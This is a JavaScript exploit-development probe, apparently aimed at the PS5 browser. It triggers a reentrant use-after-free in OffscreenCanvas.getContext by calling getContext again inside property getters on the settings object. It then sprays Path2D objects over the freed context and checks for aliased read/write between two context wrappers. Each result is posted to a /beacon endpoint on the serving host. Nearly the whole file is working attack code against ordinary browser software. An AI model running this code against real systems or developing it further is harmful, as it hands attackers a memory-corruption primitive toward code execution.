// p508 — OffscreenCanvas getContext UAF test
//
// OffscreenCanvas.cpp:243-263 has IDENTICAL reentrant getContext pattern as HTMLCanvasElement
// Same bug shape: no m_context recheck after settings dict conversion
//
// Key difference: OffscreenCanvas contexts may use different allocation paths
// (OffscreenCanvasRenderingContext2D vs CanvasRenderingContext2D)
//
// Tests:
//   T1: OffscreenCanvas availability on PS5
//   T2: Cross-type UAF (bitmaprenderer outer + 2d inner) on OffscreenCanvas
//   T3: Same-type UAF via desynchronized getter on OffscreenCanvas
//   T4: Path2D carrier spray on freed OffscreenCanvas context
//   T5: Worker-based OffscreenCanvas (transferControlToOffscreen)
//
// Beacon prefix: V508-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V508-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // T1: OffscreenCanvas availability
  // ═══════════════════════════════════════════════════════════
  var hasOffscreen = typeof OffscreenCanvas !== 'undefined';
  B('T1-OFFSCREEN', 'available=' + hasOffscreen);

  if (!hasOffscreen) {
    // Try transferControlToOffscreen as fallback check
    var tc = document.createElement('canvas');
    tc.width = 1; tc.height = 1;
    var hasTransfer = typeof tc.transferControlToOffscreen === 'function';
    B('T1-TRANSFER', 'available=' + hasTransfer);
    if (!hasTransfer) {
      B('DEAD', 'No OffscreenCanvas support');
      return;
    }
  }

  // ═══════════════════════════════════════════════════════════
  // T2: Direct OffscreenCanvas construction + context types
  // ═══════════════════════════════════════════════════════════
  var oc = null;
  try {
    oc = new OffscreenCanvas(10, 10);
    B('T2-CREATE', 'ok=true');
  } catch(e) {
    B('T2-CREATE', 'ok=false,err=' + e.name);
    // If direct construction fails, try transfer
    try {
      var htmlC = document.createElement('canvas');
      htmlC.width = 10; htmlC.height = 10;
      oc = htmlC.transferControlToOffscreen();
      B('T2-TRANSFER', 'ok=true');
    } catch(e2) {
      B('T2-TRANSFER', 'ok=false,err=' + e2.name);
      B('DEAD', 'Cannot create OffscreenCanvas');
      return;
    }
  }

  // Check available context types
  var ctx2d = null, ctxBM = null, ctxWebGL = null;
  try { ctx2d = oc.getContext('2d'); } catch(e) {}
  B('T2-CTX2D', 'available=' + !!ctx2d);

  // Need fresh OffscreenCanvas for each context type test
  var oc2 = null;
  try { oc2 = new OffscreenCanvas(10, 10); } catch(e) {}
  if (oc2) {
    try { ctxBM = oc2.getContext('bitmaprenderer'); } catch(e) {}
    B('T2-CTXBM', 'available=' + !!ctxBM);
  }

  var oc3 = null;
  try { oc3 = new OffscreenCanvas(10, 10); } catch(e) {}
  if (oc3) {
    try { ctxWebGL = oc3.getContext('webgl'); } catch(e) {}
    B('T2-CTXWEBGL', 'available=' + !!ctxWebGL);
  }

  // ═══════════════════════════════════════════════════════════
  // T3: Cross-type UAF on OffscreenCanvas
  // ═══════════════════════════════════════════════════════════
  if (ctxBM !== null || (oc2 && typeof oc2.getContext === 'function')) {
    var ocUAF = null;
    try { ocUAF = new OffscreenCanvas(10, 10); } catch(e) {}
    if (ocUAF) {
      var dOCtx = null;
      var cc = 0;
      var settings = {};
      Object.defineProperty(settings, 'alpha', {
        get: function() {
          cc++;
          if (cc === 1) {
            dOCtx = ocUAF.getContext('2d');
          }
          return true;
        }
      });
      var bmOCtx = null;
      try { bmOCtx = ocUAF.getContext('bitmaprenderer', settings); } catch(e) {
        B('T3-ERR', e.name + ':' + e.message);
      }
      B('T3-CROSSTYPE', 'dOCtx=' + !!dOCtx + ',bmOCtx=' + !!bmOCtx + ',cc=' + cc);

      if (dOCtx) {
        // Try save() marker
        var saveOk = false;
        try { dOCtx.save(); saveOk = true; } catch(e) {
          B('T3-SAVE-ERR', e.name + ':' + e.message);
        }
        B('T3-SAVE', 'ok=' + saveOk);

        // Path2D spray test
        if (!saveOk) {
          var srcP = new Path2D();
          srcP.moveTo(1, 2);
          for (var i = 1; i <= 12; i++) srcP.lineTo(i*10, i*20);

          var p2d = [];
          for (var j = 0; j < 500; j++) p2d.push(new Path2D(srcP));
          B('T3-SPRAY', 'path2d=500');

          var saveAfterSpray = false;
          try { dOCtx.save(); saveAfterSpray = true; } catch(e) {}
          B('T3-SAVE-AFTER', 'ok=' + saveAfterSpray);
        }
      }
    }
  } else {
    B('T3-SKIP', 'no bitmaprenderer on OffscreenCanvas');
  }

  // ═══════════════════════════════════════════════════════════
  // T4: Same-type UAF via desynchronized getter on OffscreenCanvas
  // ═══════════════════════════════════════════════════════════
  var ocST = null;
  try { ocST = new OffscreenCanvas(10, 10); } catch(e) {}
  if (ocST) {
    var stCtx = null;
    var cc2 = 0;
    var s2 = {};
    Object.defineProperty(s2, 'desynchronized', {
      get: function() {
        cc2++;
        if (cc2 === 1) {
          stCtx = ocST.getContext('2d');
        }
        return false;
      }
    });
    var outerOCtx = null;
    try { outerOCtx = ocST.getContext('2d', s2); } catch(e) {
      B('T4-ERR', e.name + ':' + e.message);
    }
    B('T4-SAMETYPE', 'stCtx=' + !!stCtx + ',outerOCtx=' + !!outerOCtx + ',cc=' + cc2);

    if (stCtx && outerOCtx) {
      // Same-type: both wrappers alive, aliased R/W
      var sameObj = (stCtx === outerOCtx);
      B('T4-ALIAS', 'same=' + sameObj);

      // Test write-through
      try {
        stCtx.globalAlpha = 0.42;
        var readBack = outerOCtx.globalAlpha;
        B('T4-WRITETHRU', 'set=0.42,read=' + readBack + ',match=' + (Math.abs(readBack - 0.42) < 0.001));
      } catch(e) {
        B('T4-WRITETHRU-ERR', e.name);
      }
    }
  }

  // ═══════════════════════════════════════════════════════════
  // T5: sizeof check — OffscreenCanvas context may differ from HTMLCanvas context
  // ═══════════════════════════════════════════════════════════
  // Check if save/restore behavior differs (indicates different object layout)
  var ocSize = null;
  try { ocSize = new OffscreenCanvas(10, 10); } catch(e) {}
  if (ocSize) {
    var sizeCtx = ocSize.getContext('2d');
    if (sizeCtx) {
      // Properties that exist on CanvasRenderingContext2D
      var props = ['lineWidth', 'globalAlpha', 'shadowBlur', 'shadowOffsetX',
                   'shadowOffsetY', 'lineDashOffset', 'miterLimit', 'font',
                   'textAlign', 'textBaseline', 'direction', 'imageSmoothingEnabled',
                   'imageSmoothingQuality', 'globalCompositeOperation',
                   'strokeStyle', 'fillStyle', 'filter'];
      var available = [];
      for (var p = 0; p < props.length; p++) {
        if (props[p] in sizeCtx) available.push(props[p]);
      }
      B('T5-PROPS', 'count=' + available.length + '/' + props.length);

      // Check if OffscreenCanvasRenderingContext2D has canvas property
      var hasCanvas = 'canvas' in sizeCtx;
      B('T5-CANVAS-PROP', 'has=' + hasCanvas);
    }
  }

  B('DONE', 'all tests complete');
})();
